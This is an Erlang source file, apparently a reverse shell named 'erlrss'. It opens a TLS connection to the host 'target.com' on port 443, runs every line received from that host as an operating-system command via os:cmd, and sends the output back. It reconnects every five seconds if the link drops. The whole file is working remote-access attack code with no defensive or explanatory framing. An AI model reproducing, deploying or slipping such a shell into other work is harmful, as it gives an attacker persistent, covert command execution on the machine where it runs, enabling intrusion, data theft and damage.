-module(erlrss).
-export([main/0, loop/1]).

main() ->
    ssl:start(),
    case ssl:connect("target.com", 443,
                [{active,false},
                {send_timeout, 5000},
                {packet, line},
                {cacertfile, "/opt/erlrs/root.crt"}
                %{verify, verify_peer}
                ]) of
                              
        {ok, Sock} ->
            loop(Sock);
        
        {error, Reason} ->
            timer:sleep(5000),
            main()
    end.

loop(Sock) ->
    case ssl:recv(Sock, 0) of 
        {ok, Data} ->
	    ssl:send(Sock, os:cmd(Data)),
	    loop(Sock);
        
        {error, Reason} ->
            main()
    end.
